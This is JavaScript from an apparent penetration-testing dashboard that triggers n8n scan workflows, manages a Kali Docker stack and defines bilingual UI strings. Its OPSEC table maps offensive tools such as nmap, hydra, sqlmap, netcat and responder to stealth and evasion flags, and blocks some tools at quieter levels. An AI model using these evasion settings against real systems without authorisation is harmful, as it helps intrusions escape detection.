        const n8nUrl   = urlInput.value.trim();
        const target   = targetInput.value.trim();
        const scanType = scanSelect.value;

        if (!n8nUrl) {
            showToast('⚠️ Enter your n8n server URL first');
            return;
        }
        if (!target) {
            showToast('⚠️ Enter a target domain or IP');
            return;
        }

        saveN8nUrl();
        btn.disabled = true;
        btn.textContent = '⏳ Scanning...';
        statusSpan.textContent = '⏳ triggering workflow...';

        appendN8nLog(`[•] Triggering Attack Surface Scan on ${target} (${scanType})`);
        appendN8nLog(`[•] n8n URL: ${n8nUrl}`);

        try {
            const resp = await fetch((window.API_URL || '') + '/api/n8n/trigger', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: target,
                    scan_type: scanType,
                    n8n_url: n8nUrl
                })
            });
            const data = await resp.json();

            if (data.ok) {
                appendN8nLog(`[✓] Workflow triggered successfully (HTTP ${data.status})`);
                if (data.data) {
                    // Try to format as JSON if possible
                    try {
                        const parsed = JSON.parse(data.data);
                        appendN8nLog(`[=] Response: ${JSON.stringify(parsed, null, 2)}`);
                    } catch {
                        appendN8nLog(`[=] Response: ${data.data.substring(0, 500)}`);
                    }
                }
                statusSpan.textContent = '✅ Scan triggered';
                showToast(`✅ Attack Surface Scan triggered for ${target}`);
            } else {
                appendN8nLog(`[✗] Workflow failed (HTTP ${data.status}): ${data.error || 'unknown error'}`);
                statusSpan.textContent = '❌ Failed';
                showToast(`❌ Workflow trigger failed: ${data.error || 'unknown error'}`);
            }
        } catch (err) {
            appendN8nLog(`[✗] Error: ${err.message}`);
            statusSpan.textContent = '⚠️ Error';
            showToast(`⚠️ Trigger error: ${err.message}`);
        } finally {
            btn.disabled = false;
            btn.textContent = '▶ Trigger Scan';
        }
    };

    function appendN8nLog(msg) {
        const logDiv = document.getElementById('n8n-log');
        if (!logDiv) return;
        // Remove the placeholder text if still there
        if (logDiv.textContent.includes('No scans triggered yet')) {
            logDiv.textContent = '';
        }
        const line = document.createElement('div');
        line.textContent = msg;
        line.className = 'text-gray-400';
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    window.clearN8nLog = function () {
        const logDiv = document.getElementById('n8n-log');
        if (logDiv) {
            logDiv.textContent = '';
            const placeholder = document.createElement('span');
            placeholder.className = 'text-gray-700';
            placeholder.textContent = '[—] Log cleared.';
            logDiv.appendChild(placeholder);
        }
        document.getElementById('n8n-scan-status').textContent = '';
        showToast('✕ Log cleared');
    };

    // ── Init n8n ──
    loadN8nUrl();

    // ============================================================
    //  TOAST NOTIFICATIONS
    // ============================================================
    function showToast(msg) {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // ============================================================
    //  OPSEC LEVELS (Silent / Covert / Loud)
    //  Controls how noisy tools are on the target.
    //  Backend: GET /api/opsec/levels · POST /api/opsec/apply
    // ============================================================
    window.opsecLevel = localStorage.getItem('mirv_opsec') || 'loud';

    // Local fallback mapping used when backend /api/opsec/apply is unreachable.
    // Mirrors backend apply_opsec() modifiers — flags-only, never full command rewrite.
    // Tool → { silent: 'BLOCKED' | flags | null, covert: 'BLOCKED' | flags | null }
    // (null = no modification, run as-is)
    const _OPSEC_RULES = {
        // ─── Recon / web scanners ───
        nmap:        { silent: '-sS -T2 -n --max-rate 50 -sV --data-length 24 -g 53', covert: '-sS -T3 -n --max-rate 200 -sV' },
        masscan:     { silent: 'BLOCKED', covert: '--rate=100 --wait 5' },
        nuclei:      { silent: 'BLOCKED', covert: '--rate-limit 10 --concurrency 5' },
        nikto:       { silent: 'BLOCKED', covert: '-evasion 1 -timeout 5' },
        whatweb:     { silent: '-a 1',    covert: '-a 3' },
        gobuster:    { silent: '--delay 500ms -t 5 -q', covert: '-t 20 -q' },
        ffuf:        { silent: '-t 2 -rate 10', covert: '-t 10 -rate 50' },
        dirb:        { silent: '-r -S',   covert: '-r' },
        wpscan:      { silent: 'BLOCKED', covert: '--stealthy' },
        feroxbuster: { silent: 'BLOCKED', covert: '-t 5 --depth 2 --rate 10 --quiet' },
        wfuzz:       { silent: 'BLOCKED', covert: '--hc 404 --hl 0 -t 5' },
        cewl:        { silent: '-d 1 -m 5', covert: '-d 2 -m 5' },
        dnsrecon:    { silent: '-d --type std', covert: null, loud: '-a' },

        // ─── Bruteforce / exploit ───
        hydra:       { silent: 'BLOCKED', covert: '-t 1 -W 5 -f' },
        'hydra-ssh': { silent: 'BLOCKED', covert: '-t 1 -W 5 -f' },
        'hydra-ftp': { silent: 'BLOCKED', covert: '-t 1 -W 5 -f' },
        sqlmap:      { silent: 'BLOCKED', covert: '--batch --random-agent --delay 2 --risk 1 --level 1' },
        xsstrike:    { silent: 'BLOCKED', covert: '--delay 2 --timeout 5' },
        dalfox:      { silent: 'BLOCKED', covert: '--delay 2 --only-poc r' },

        // ─── Network / port utilities ───
        netcat:      { silent: 'BLOCKED', covert: '-zv -w 2' },

        // ─── Enum / SMB / LDAP / AD ───
        enum4linux:  { silent: 'BLOCKED', covert: '-s -M -l' },
        smbclient:   { silent: 'BLOCKED', covert: '-N -l' },
        smbmap:      { silent: 'BLOCKED', covert: '-R . --depth 1' },
        ldapsearch:  { silent: '-x -s base', covert: '-x -s sub -z 100' },
        bloodhound:  { silent: 'BLOCKED', covert: '-c Group,Computers --2025collection' },

        // ─── Sniffing / LLMNR / NTLM relay ───
        responder:   { silent: 'BLOCKED', covert: 'BLOCKED' },

        // ─── TLS / WAF / headers ───
        testssl:     { silent: 'BLOCKED', covert: '--quiet --fast --parallel 1' },
        wafw00f:     { silent: '-b',      covert: null, loud: '-a' },
        'cors-check':{ silent: 'BLOCKED', covert: null },
        'headers-scan':{ silent: null, covert: null },
        'secrets-scan':{ silent: null, covert: null },
        'port-scan':   { silent: null, covert: null },
        'subdomain-scan':{ silent: null, covert: null },
        'dns-lookup':    { silent: null, covert: null },
        'hash-crack':    { silent: null, covert: null },
        'stego-tool':    { silent: null, covert: null },
        'news-scraper':  { silent: null, covert: null },
        'api-scanner':   { silent: null, covert: null },

        // ─── Misc ───
        curl:        { silent: "-s -I -L --user-agent 'Mozilla/5.0'", covert: null },
        searchsploit:{ silent: null, covert: null },
        'evil-winrm':{ silent: null, covert: null },
    };

    function _opsecFallback(tool, command, level) {
        // Returns {blocked, reason, modified_command}
        const lc = tool.toLowerCase();
        const rule = _OPSEC_RULES[lc];
        if (!rule) return { blocked: false, reason: 'ok', modified_command: command };

        const action = rule[level];
        if (action === 'BLOCKED') {
            return { blocked: true, reason: `${tool} is blocked at ${level} level`, modified_command: command };
        }
        if (!action) {
            // null = no modification (allowed to run as-is).
            // For covert on tools that historically warned (masscan/nikto/nuclei/hydra-*),
            // preserve 'warn' reason so the UI shows the alert.
            const warnCovert = ['masscan', 'nikto', 'nuclei', 'hydra', 'hydra-ssh', 'hydra-ftp'];
            if (level === 'covert' && warnCovert.includes(lc)) {
                return { blocked: false, reason: 'warn', modified_command: command };
            }
            return { blocked: false, reason: 'ok', modified_command: command };
        }
        // flags-only append (mirrors backend apply_opsec — never replace command).
        return { blocked: false, reason: 'ok', modified_command: `${command} ${action.trim()}` };
    }

    function _opsecUpdateBadge(level) {
        const badge = document.getElementById('opsec-badge');
        if (!badge) return;
        const map = {
            silent: { text: '🟢 SILENT', color: '#3b8f8a', border: '#3b8f8a44', bg: '#3b8f8a11', title: 'OPSEC Level: Silent' },
            covert: { text: '🟡 COVERT', color: '#d4a843', border: '#d4a84344', bg: '#d4a84311', title: 'OPSEC Level: Covert' },
            loud:   { text: '🔴 LOUD',   color: '#dc2828', border: '#dc282844', bg: '#dc282811', title: 'OPSEC Level: Loud (default)' }
        };
        const c = map[level] || map.loud;
        badge.textContent = c.text;
        badge.title = c.title;
        badge.style.borderColor = c.border;
        badge.style.color = c.color;
        badge.style.background = c.bg;
    }

    window.opsecModalOpen = function () {
        const modal = document.getElementById('opsec-modal');
        if (!modal) return;
        modal.classList.remove('hidden');
        // Pre-select current level
        const radios = document.getElementsByName('opsec-level');
        for (const r of radios) {
            r.checked = (r.value === window.opsecLevel);
        }
    };

    window.opsecModalClose = function () {
        const modal = document.getElementById('opsec-modal');
        if (modal) modal.classList.add('hidden');
    };

    window.opsecSave = function () {
        const checked = document.querySelector('input[name="opsec-level"]:checked');
        const level = checked ? checked.value : 'loud';
        localStorage.setItem('mirv_opsec', level);
        window.opsecLevel = level;
        _opsecUpdateBadge(level);
        window.opsecModalClose();
        showToast(`✅ OPSEC level: ${level}`);
    };

    // Apply OPSEC level to a command before it is sent over WS.
    // Returns { blocked:bool, reason:string, modified_command:string }.
    window.opsecApply = async function (tool, command, target) {
        const level = window.opsecLevel || 'loud';
        if (level === 'loud') {
            return { blocked: false, reason: 'loud', modified_command: command };
        }
        // Optional target — fall back to current #target-ip input if not supplied.
        const tgt = (typeof target === 'string' && target.trim()) ||
                    document.getElementById('target-ip')?.value?.trim() || '';
        try {
            const resp = await fetch('/api/opsec/apply', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ tool, command, level, target: tgt })
            });
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            const data = await resp.json();
            // Expect { blocked, reason, modified_command }
            return {
                blocked: !!data.blocked,
                reason: data.reason || 'ok',
                modified_command: data.modified_command || command
            };
        } catch (e) {
            console.warn('[OPSEC] fallback local — backend unavailable:', e.message);
            return _opsecFallback(tool, command, level);
        }
    };

    // Close OPSEC modal on Escape / backdrop click
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') window.opsecModalClose();
    });
    document.addEventListener('click', function (e) {
        const modal = document.getElementById('opsec-modal');
        if (modal && e.target === modal) window.opsecModalClose();
    });

    // Init badge on load
    _opsecUpdateBadge(window.opsecLevel);

    // ============================================================
    //  DOCKER CONTROL — start/stop/clean/build stack
    //  Backend: GET /api/docker/status · POST /api/docker/start · /stop · /clean · /build
    // ============================================================

    let _dockerPollTimer = null;

    async function _dockerApi(endpoint, method = 'GET') {
        try {
            const r = await fetch(endpoint, { method });
            return await r.json();
        } catch (e) {
            return { ok: false, error: e.message };
        }
    }

    function _dockerUpdateBadge(status) {
        const dot = document.getElementById('docker-dot');
        const text = document.getElementById('docker-text');
        const badge = document.getElementById('docker-badge');
        if (!dot || !text || !badge) return;

        if (!status || !status.installed) {
            dot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-gray-700';
            text.textContent = 'Docker N/A';
            badge.title = 'Docker not installed';
            return;
        }
        const kaliRuns = status.kali_running;
        const backRuns = status.backend_running;

        if (kaliRuns && backRuns) {
            dot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-neon';
            text.textContent = '🐳 Stack UP';
            badge.title = `Both running. Containers: ${(status.containers || []).map(c => c.name).join(', ') || 'none'}`;
        } else if (backRuns && !kaliRuns) {
            dot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-amber-500';
            text.textContent = '🐳 Kali DOWN';
            badge.title = 'Kali tools stopped. Click to start.';
        } else if (status.running) {
            dot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-amber-500';
            text.textContent = '🐳 Degraded';
            badge.title = 'Some containers down.';
        } else {
            dot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-gray-600';
            text.textContent = '🐳 Stack DOWN';
            badge.title = 'Stack stopped. Click to start.';
        }
    }

    function _dockerUpdateModal(status) {
        const statusEl = document.getElementById('docker-modal-status');
        const listEl = document.getElementById('docker-container-list');
        if (!statusEl || !listEl) return;

        const btns = ['docker-btn-start', 'docker-btn-stop', 'docker-btn-clean', 'docker-btn-build']
            .map(id => document.getElementById(id));

        if (!status || !status.installed) {
            statusEl.textContent = '❌ Docker not installed';
            statusEl.className = 'text-blood';
            listEl.innerHTML = '<div class="text-gray-600">Install Docker Desktop first.</div>';
            btns.forEach(b => { if (b) b.disabled = true; });
            return;
        }

        const kaliRunning = status.kali_running || false;
        const backendRunning = status.backend_running || false;

        if (status.running) {
            statusEl.textContent = backendRunning ? '🟢 Running' : '🔴 Degraded';
            statusEl.className = backendRunning ? 'text-cyber' : 'text-amber-500';
        } else {
            statusEl.textContent = '🔴 Stopped';
            statusEl.className = 'text-blood';
        }

        // Start: enabled only when kali-tools is NOT running
        btns[0].disabled = kaliRunning;
        // Stop: enabled only when kali-tools IS running
        btns[1].disabled = !kaliRunning || !backendRunning;
        // Clean: enabled only when kali-tools IS running (or was running)
        btns[2].disabled = !kaliRunning && !status.running;
        // Build: enabled when backend is running
        btns[3].disabled = !backendRunning;

        const containers = (status.containers || []).filter(c => c.name && c.name !== '?');
        if (containers.length === 0) {
            listEl.innerHTML = '<div class="text-gray-600">No MIRV containers found.</div>';
        } else {
            listEl.innerHTML = containers.map(c =>
                `<div class="flex justify-between">
                    <span class="text-gray-400">${c.service || c.name}</span>
                    <span class="${c.state === 'running' ? 'text-cyber' : 'text-gray-600'}">${c.state}</span>
                </div>`
            ).join('');
        }
    }

    async function _dockerRefresh() {
        const data = await _dockerApi('/api/docker/status');
        _dockerUpdateBadge(data);
        const modal = document.getElementById('docker-modal');
        if (modal && !modal.classList.contains('hidden')) {
            _dockerUpdateModal(data);
        }
        return data;
    }

    function _dockerLog(msg, isError = false) {
        const log = document.getElementById('docker-log');
        if (!log) return;
        const line = document.createElement('div');
        line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        line.className = isError ? 'text-blood' : 'text-gray-500';
        log.appendChild(line);
        log.scrollTop = log.scrollHeight;
    }

    async function _dockerAction(endpoint, actionLabel, btnId) {
        const btn = document.getElementById(btnId);
        if (btn) { btn.disabled = true; btn.textContent = '⏳...'; }
        _dockerLog(`⏳ ${actionLabel}...`);

        const result = await _dockerApi(endpoint, 'POST');

        // If the API returns a task_id → async (build only), poll for completion
        if (result.ok && result.task_id) {
            _dockerLog(`⏳ ${actionLabel} — background task started`);
            showToast(`🐳 ${actionLabel} — background task started`);
            _dockerPollTask(result.task_id, actionLabel, btn);
            return;
        }

        // Synchronous result (start/stop/clean) — success/fail is final
        if (result.ok && result.msg) {
            _dockerLog(`✅ ${actionLabel} — ${result.msg}`);
            showToast(`🐳 ${actionLabel} — ${result.msg}`);
        } else {
            const err = result.stderr || result.error || 'failed';
            _dockerLog(`❌ ${actionLabel} — ${err}`, true);
            showToast(`🐳 ${actionLabel} — ${err}`);
        }

        if (btn) { btn.disabled = false; btn.textContent = actionLabel.split(' ')[0]; }
        setTimeout(_dockerRefresh, 1500);
    }

    async function _dockerPollTask(taskId, actionLabel, btn) {
        let attempts = 0;
        const maxAttempts = 120; // 2 minutes at 1s interval
        const poll = async () => {
            try {
                const r = await fetch(`/api/docker/task/${taskId}`);
                const data = await r.json();
                if (data.ok && data.task) {
                    if (data.task.status === 'done') {
                        _dockerLog(`✅ ${actionLabel} — completed`);
                        showToast(`🐳 ${actionLabel} — completed`);
                        if (btn) { btn.disabled = false; btn.textContent = actionLabel.split(' ')[0]; }
                        setTimeout(_dockerRefresh, 1500);
                        return;
                    }
                    if (data.task.status === 'failed') {
                        const err = (data.task.result && data.task.result.stderr) || data.task.error || 'unknown error';
                        _dockerLog(`❌ ${actionLabel} — ${err}`, true);
                        showToast(`🐳 ${actionLabel} — ${err}`);
                        if (btn) { btn.disabled = false; btn.textContent = actionLabel.split(' ')[0]; }
                        setTimeout(_dockerRefresh, 1500);
                        return;
                    }
                }
            } catch (e) {
                // If the task endpoint fails (container restarting), keep waiting
                console.warn('[Docker] task poll error:', e.message);
            }
            if (++attempts < maxAttempts) {
                setTimeout(poll, 1000);
            } else {
                _dockerLog(`⚠️ ${actionLabel} — timed out waiting for completion`, true);
                if (btn) { btn.disabled = false; btn.textContent = actionLabel.split(' ')[0]; }
                setTimeout(_dockerRefresh, 1500);
            }
        };
        setTimeout(poll, 1000);
    }

    window.dockerStatus = _dockerRefresh;

    window.dockerModalOpen = function () {
        const modal = document.getElementById('docker-modal');
        if (!modal) return;
        modal.classList.remove('hidden');
        _dockerRefresh(); // populate modal
    };

    window.dockerModalClose = function () {
        const modal = document.getElementById('docker-modal');
        if (modal) modal.classList.add('hidden');
    };

    window.dockerStart = function () {
        _dockerAction('/api/docker/start', 'Start stack', 'docker-btn-start');
    };

    window.dockerStop = function () {
        _dockerAction('/api/docker/stop', 'Stop stack', 'docker-btn-stop');
    };

    window.dockerClean = function () {
        if (!confirm('⚠️ This will REMOVE ALL VOLUMES (kali-sessions, wordlists, logs). Continue?')) return;
        _dockerAction('/api/docker/clean', 'Clean stack', 'docker-btn-clean');
    };

    window.dockerBuild = function () {
        if (!confirm('⚠️ Rebuild images from scratch (no cache). This takes 10+ minutes. Continue?')) return;
        _dockerAction('/api/docker/build', 'Rebuild stack', 'docker-btn-build');
    };

    // Close on Escape / backdrop click
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') window.dockerModalClose();
    });
    document.addEventListener('click', function (e) {
        const modal = document.getElementById('docker-modal');
        if (modal && e.target === modal) window.dockerModalClose();
    });

    // Poll Docker status every 30s
    async function _dockerPollLoop() {
        try {
            await _dockerRefresh();
        } catch (e) {
            console.warn('[Docker] poll error:', e);
        }
        _dockerPollTimer = setTimeout(_dockerPollLoop, 30000);
    }
    // Start polling after a small delay
    setTimeout(_dockerPollLoop, 2000);

    // ============================================================
    //  THEME TOGGLE (Monochrome Mode)
    // ============================================================
    window.toggleTheme = function () {
        const isMono = document.body.classList.toggle('monochrome');
        localStorage.setItem('vulnforge_theme', isMono ? 'mono' : 'neon');
        document.getElementById('theme-icon').textContent = isMono ? '◇' : '☾';
        showToast(isMono ? '◼ Monochrome mode' : '🟢 Neon mode');
    };

    // Load saved theme
    if (localStorage.getItem('vulnforge_theme') === 'mono') {
        document.body.classList.add('monochrome');
        document.getElementById('theme-icon').textContent = '◇';
    }

    // ============================================================
    //  LANGUAGE (ES/EN)
    // ============================================================
    const translations = {
        appName:           { en: 'M.I.R.V.',         es: 'M.I.R.V.' },
        headerTag:         { en: '/* Multi-platform Incident Response & Vulnerabilities */', es: '/* Multi-platform Incident Response & Vulnerabilities */' },
        targetLabel:       { en: '>> Target_',       es: '>> Objetivo_' },
        targetPlaceholder: { en: '10.10.10.5 | domain.htb', es: '10.10.10.5 | dominio.htb' },
        connections:       { en: '>> Connections_',  es: '>> Conexiones_' },
        newConn:           { en: '+ New',            es: '+ Nueva' },
        selTarget:         { en: '-- Select target --', es: '-- Seleccionar --' },
        connAlias:         { en: 'Alias (eg: Kali-VPN)', es: 'Alias (ej: Kali-VPN)' },
        connIP:            { en: 'IP: 192.168.1.x',  es: 'IP: 192.168.1.x' },
        connUser:          { en: 'User',             es: 'Usuario' },
        connPass:          { en: 'Pass',             es: 'Contraseña' },
        btnSave:           { en: '✓ Save',           es: '✓ Guardar' },
        btnCancel:         { en: '✕ Cancel',         es: '✕ Cancelar' },
        arsenal:           { en: 'Arsenal',          es: 'Arsenal' },
        catWebRecon:       { en: 'Web Recon',        es: 'Web Recon' },
        catNetwork:        { en: 'Network',          es: 'Red' },
        catSMB:            { en: 'SMB / Windows',    es: 'SMB / Windows' },
        catPivoting:       { en: 'Pivoting',         es: 'Pivoting' },
        catCrypto:         { en: 'Crypto / Decode',  es: 'Crypto / Decod' },
        catExploitation:   { en: 'Exploitation',     es: 'Explotación' },
        catResources:      { en: 'Resources',        es: 'Recursos' },
        catUtilities:      { en: 'Utilities',        es: 'Utilidades' },
        catOsint:          { en: 'OSINT',            es: 'OSINT' },
        catPentest:        { en: 'Pentest Labs',     es: 'Labs Pentest' },
        catBugbounty:      { en: 'Bug Bounty',       es: 'Bug Bounty' },
        tabTerminal:       { en: '⌨ Terminal',       es: '⌨ Terminal' },
        tabReports:        { en: '📊 Reports',       es: '📊 Informes' },
        tabScripts:        { en: '⚡ Scripts',       es: '⚡ Scripts' },
        tabBounty:         { en: '📋 Bounty',        es: '📋 Bounty' },
        tabAI:             { en: '🤖 AI Writeup',   es: '🤖 AI Writeup' },
        tabAutomation:     { en: '⚙ Automation',   es: '⚙ Automatización' },
        tabOpAdmiral:      { en: '🎯 Op Admiral',    es: '🎯 Almirante' },
        tabSwarm:          { en: '🐝 Swarm',          es: '🐝 Enjambre' },
        btnConnect:        { en: '> Connect',        es: '> Conectar' },
        btnDisconnect:     { en: '> Disconnect',     es: '> Desconectar' },
        cmdPlaceholder:    { en: '$  enter command...', es: '$  ingresa comando...' },
        btnExecute:        { en: '⏎',                es: '⏎' },
        modulesLoaded:     { en: 'modules loaded',   es: 'módulos cargados' },
        scanReports:       { en: '📊 Scan Reports',  es: '📊 Informes de Escaneo' },
        clearAll:          { en: '✕ clear all',      es: '✕ limpiar todo' },
        noReports:         { en: 'No reports yet',   es: 'Sin informes aún' },
        noReportsDesc:     { en: 'Run a scan from the Arsenal to see results here', es: 'Ejecuta un escaneo desde el Arsenal' },
        templates:         { en: 'Templates',        es: 'Plantillas' },
        editor:            { en: 'EDITOR',           es: 'EDITOR' },
        deployRun:         { en: '⬆ Deploy & Run',  es: '⬆ Desplegar & Ejec' },
        bountyTitle:       { en: '📋 Bug Bounty Report Generator', es: '📋 Generador de Reportes Bounty' },
        aiTitle:           { en: '🤖 AI Writeup Generator', es: '🤖 Generador de Writeups IA' },
        apiConfig:         { en: '⚙ API Configuration', es: '⚙ Configuración API' },
        genReport:         { en: '⚡ Generate Report', es: '⚡ Generar Reporte' },
        downloadMD:        { en: '⬇ Download .md',  es: '⬇ Descargar .md' },
        genWriteup:        { en: '🤖 Generate Writeup', es: '🤖 Generar Writeup' },
        offline:           { en: 'OFFLINE',          es: 'DESCONECTADO' },
        online:            { en: 'ONLINE',           es: 'CONECTADO' },
        disconnected:      { en: 'disconnected',     es: 'desconectado' },
        connected:         { en: 'connected',        es: 'conectado' },
        tabHak5:           { en: '🔌 Hak5',          es: '🔌 Hak5' },
        tabFindings:       { en: '🎯 Findings',       es: '🎯 Hallazgos' },
        tabCredentials:    { en: '🔑 Credentials',     es: '🔑 Credenciales' },
        statFindings:      { en: '📊 {n} findings',   es: '📊 {n} hallazgos' },
        statTargets:       { en: '📡 {n} targets',    es: '📡 {n} objetivos' },
        statTools:         { en: '🔧 {n} tools',      es: '🔧 {n} herramientas' },
        statReports:       { en: '📁 {n} reports',    es: '📁 {n} informes' },
        findingsTitle:     { en: '🎯 Findings',       es: '🎯 Hallazgos' },
        clearFindings:     { en: '✕ Clear all',       es: '✕ Limpiar todo' },
        exportFindings:    { en: '📥 Export',         es: '📥 Exportar' },
        generateReportBtn: { en: '📊 Generate Report', es: '📊 Generar Informe' },
        suggestBtn:        { en: '🔍 Suggest next step', es: '🔍 Sugerir siguiente paso' },
        exportAll:         { en: '⬇ Export all',      es: '⬇ Exportar todo' },
        apiKeyPlaceholder: { en: 'API Key',           es: 'Clave API' },
        modelPlaceholder:  { en: 'Model (eg: gemini-2.0-flash)', es: 'Modelo (ej: gemini-2.0-flash)' },
        orLabel:           { en: 'or',                es: 'o' },
        useAIConfig:       { en: 'use AI Writeup config', es: 'usar config AI Writeup' },
        tabMobile:         { en: '📱 Mobile',          es: '📱 Mobile' },
        tabForensics:      { en: '🔍 Forensics',       es: '🔍 Forensics' },
        tabExif:           { en: '📷 EXIF',            es: '📷 EXIF' },
        tabCanary:         { en: '🪤 Canary',          es: '🪤 Canario' },
        tabKnowledgebase:  { en: '📚 KnowledgeBase',   es: '📚 KnowledgeBase' },
        tabCTF:            { en: '🏴 CTF',              es: '🏴 CTF' },
        tabDlp:            { en: '🛡️ DLP',             es: '🛡️ DLP' },

        // ── DLP Scanner ──
        "dlp-title":        { en: '🛡️ DLP Scanner',         es: '🛡️ Escáner DLP' },
        "dlp-ready":        { en: 'Ready',                    es: 'Listo' },
        "dlp-text-tab":     { en: 'Raw Text',                 es: 'Texto sin formato' },
        "dlp-scan-btn":     { en: '🔍 Scan Text',             es: '🔍 Escanear Texto' },
        "dlp-file-tab":     { en: 'File Upload',              es: 'Subir Archivo' },
        "dlp-drop-text":    { en: 'Drop a file or click to upload', es: 'Arrastra un archivo o haz clic para subir' },
        "dlp-url-tab":      { en: 'URL Scan',                 es: 'Escanear URL' },
        "dlp-scan-url":     { en: 'Scan URL',                 es: 'Escanear URL' },
        "dlp-scanning":     { en: 'Scanning for PII...',      es: 'Escaneando PII...' },
        "dlp-findings":     { en: 'Findings',                 es: 'Hallazgos' },
        "dlp-high":         { en: 'High',                     es: 'Alto' },
        "dlp-medium":       { en: 'Medium',                   es: 'Medio' },
        "dlp-low":          { en: 'Low',                      es: 'Bajo' },
        "dlp-risk-score":   { en: 'Risk Score',               es: 'Puntuación de Riesgo' },
        "dlp-findings-title":{ en: 'Findings',                es: 'Hallazgos' },
        "dlp-export-json":  { en: 'Export JSON',              es: 'Exportar JSON' },
        "dlp-clear-results":{ en: 'Clear',                    es: 'Limpiar' },

        // ── SIEM Dashboard ──
        tabSiem:            { en: '📊 SIEM',              es: '📊 SIEM' },
        "siem-title":       { en: '📊 SIEM Dashboard',    es: '📊 Panel SIEM' },
        "siem-refresh":     { en: 'Refresh',              es: 'Actualizar' },
        "siem-test-event":  { en: 'Generate Test Event',  es: 'Generar Evento de Prueba' },

        // ── Plugin System ──
        tabPlugins:         { en: '🔌 Plugins',              es: '🔌 Plugins' },
        "plugins-title":    { en: '🔌 Plugin System',        es: '🔌 Sistema de Plugins' },
        "plugins-stat-total":     { en: 'Total',             es: 'Total' },
        "plugins-stat-loaded":    { en: 'Loaded',            es: 'Cargados' },
        "plugins-stat-discovered":{ en: 'Discovered',        es: 'Descubiertos' },
        "plugins-stat-error":     { en: 'Errors',            es: 'Errores' },
        "plugins-no-plugins":     { en: 'No plugins discovered.', es: 'No se descubrieron plugins.' },
        "plugins-btn-load":       { en: 'Load',              es: 'Cargar' },
        "plugins-btn-unload":     { en: 'Unload',            es: 'Descargar' },
        "plugins-btn-reload":     { en: 'Reload',            es: 'Recargar' },
        "plugins-btn-enable":     { en: 'Enable',            es: 'Activar' },
        "plugins-btn-disable":    { en: 'Disable',           es: 'Desactivar' },
        "plugins-status-loaded":  { en: 'Loaded',            es: 'Cargado' },
        "plugins-status-unloaded":{ en: 'Unloaded',          es: 'Descargado' },
        "plugins-status-error":   { en: 'Error',             es: 'Error' },

        // ── Canary Tokens ──
        "canary-title":          { en: '🪤 Canary Tokens',           es: '🪤 Canary Tokens' },
        "canary-generate-title": { en: 'Generate New Token',         es: 'Generar Nuevo Token' },
        "canary-type-api":       { en: 'API Key',                    es: 'Clave API' },
        "canary-type-db":        { en: 'Database URL',               es: 'URL de Base de Datos' },
        "canary-type-jwt":       { en: 'JWT Token',                  es: 'Token JWT' },
        "canary-type-aws":       { en: 'AWS Key',                    es: 'Clave AWS' },
        "canary-type-slack":     { en: 'Slack Token',                es: 'Token Slack' },
        "canary-type-url":       { en: 'Webhook URL',                es: 'URL Webhook' },
        "canary-type-env":       { en: '.env File',                  es: 'Archivo .env' },
        "canary-type-config":    { en: 'Config File',                es: 'Archivo Config' },
        "canary-generate-btn":   { en: '+ Generate',                 es: '+ Generar' },
        "canary-generating":     { en: 'Generating token...',        es: 'Generando token...' },
        "canary-tokens-title":   { en: 'Active Tokens',              es: 'Tokens Activos' },
        "canary-empty":          { en: 'No tokens generated yet. Create one above.', es: 'Aún no hay tokens. Crea uno arriba.' },
        "canary-events-title":   { en: 'Activation Events',          es: 'Eventos de Activación' },
        "canary-events-empty":   { en: 'No activation events recorded.', es: 'No hay eventos de activación registrados.' },
        "canary-copy":           { en: 'Copy',                       es: 'Copiar' },
        "canary-delete":         { en: 'Delete',                     es: 'Eliminar' },

        // ── Terminal buttons ──
        btnConnectShort:   { en: '> Connect',          es: '> Conectar' },
        btnDisconnectShort:{ en: '> Disconnect',       es: '> Desconectar' },
        btnClear:          { en: '✕ Clear',            es: '✕ Limpiar' },
        btnStop:           { en: '⏹ Stop',             es: '⏹ Detener' },
        uploadFile:        { en: 'Upload file >',      es: 'Subir archivo >' },

        // ── AI assistant blocks (shared) ──
        aiAssistant:       { en: 'AI Assistant',      es: 'Asistente IA' },
        aiAskBtn:          { en: 'Ask',               es: 'Preguntar' },
        aiAskAIBtn:        { en: '🤖 Ask AI',         es: '🤖 Preguntar IA' },
        aiResponseHere:    { en: 'AI response will appear here', es: 'La respuesta de la IA aparecerá aquí' },
        aiThinking:        { en: '⏳ Thinking...',     es: '⏳ Pensando...' },

        // ── Reports AI ──
        aiReportAssistant: { en: 'AI Report Assistant', es: 'Asistente de Informes IA' },
        aiReportPlaceholder:{ en: 'Ask about reports (e.g. summarize, prioritize findings...)', es: 'Pregunta sobre informes (ej: resumir, priorizar hallazgos...)' },

        // ── Automation ──
        n8nWorkflow:       { en: '⚙ n8n Workflow Automation', es: '⚙ Automatización n8n' },
        n8nTriggerDesc:   { en: 'Trigger the Attack Surface Scan workflow on your n8n server. Configure the server URL below.', es: 'Dispara el workflow de Attack Surface Scan en tu servidor n8n. Configura la URL del servidor abajo.' },
        n8nUrl:            { en: 'n8n URL',            es: 'URL n8n' },
        scanParams:        { en: '🎯 Scan Parameters',  es: '🎯 Parámetros de Escaneo' },
        scanTarget:        { en: 'Target',             es: 'Objetivo' },
        scanType:          { en: 'Scan Type',         es: 'Tipo de Escaneo' },
        triggerScan:       { en: '▶ Trigger Scan',     es: '▶ Disparar Escaneo' },
        aiWorkflow:        { en: '🤖 AI Workflow',     es: '🤖 Workflow IA' },
        clearLog:          { en: '✕ Clear Log',        es: '✕ Limpiar Log' },
        executionLog:      { en: '📋 Execution Log',   es: '📋 Log de Ejecución' },
